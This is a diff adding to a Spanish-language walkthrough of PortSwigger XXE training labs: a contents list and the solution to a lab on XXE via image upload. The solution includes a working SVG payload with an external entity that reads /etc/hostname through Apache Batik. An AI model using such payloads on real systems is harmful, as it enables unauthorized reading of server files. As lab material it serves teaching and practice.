@@ -12,7 +12,16 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
 
 ## Índice
 
-
+  * [1. Lab: Exploiting XXE using external entities to retrieve files](#1-lab-exploiting-xxe-using-external-entities-to-retrieve-files)
+  * [2. Lab: Exploiting XXE to perform SSRF attacks](#2-lab-exploiting-xxe-to-perform-ssrf-attacks)
+  * [3. Lab: Blind XXE with out-of-band interaction](#3-lab-blind-xxe-with-out-of-band-interaction)
+  * [4. Lab: Blind XXE with out-of-band interaction via XML parameter entities](#4-lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
+  * [5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](#5-lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
+  * [6. Lab: Exploiting blind XXE to retrieve data via error messages](#6-lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages)
+  * [7. Lab: Exploiting XXE to retrieve data by repurposing a local DTD](#7-lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd)
+  * [8. Lab: Exploiting XInclude to retrieve files](#8-lab-exploiting-xinclude-to-retrieve-files)
+  * [9. Lab: Exploiting XXE via image file upload](#9-lab-exploiting-xxe-via-image-file-upload)
+  * [CONCLUSION](#conclusion)
 
 ## 1. Lab: Exploiting XXE using external entities to retrieve files
 
@@ -279,3 +288,35 @@ Ahora, vamos al home para verificar que completamos el laboratorio.
 
 ## 9. Lab: Exploiting XXE via image file upload
 
+```
+Este laboratorio permite a los usuarios adjuntar avatares a los comentarios y utiliza la biblioteca Apache Batik para procesar archivos de imagen de avatar.
+
+Para resolver el laboratorio, cargue una imagen que muestre el contenido del archivo /etc/hostname después de procesarlo. Luego, use el botón "Enviar solución" para enviar el valor del nombre de host del servidor.
+```
+
+Preparamos un payload, el cual sería el siguiente:
+
+```
+└──╼ $cat imagen.svg 
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+Entonces, entramos a un post del laboratorio y enviamos el fichero **imagen.svg**. Mientras que interceptamos todos los paquetes en segundo plano. Y luego al volver a ver el comentario nos encontramos con lo siguiente:
+
+![](img30.png)
+
+Entonces hacemos clic en la imagen y la deslizamos a otra ventana y nos devuelve lo siguiente:
+
+![](img31.png)
+
+Entonces el contenido de **/etc/hostname** es **b59d1a880a43**, escribimos el hostname en el home y completamos el laboratorio.
+
+![](img32.png)
+
+## CONCLUSION
+
+La vulnerabilidad XXE es muy interesante porque nos permite leer ficheros del computador y tambien poder realizar un ataque de tipo SSRF que ya analizamos en el anterior post que tiene consecuencias muy criticas.
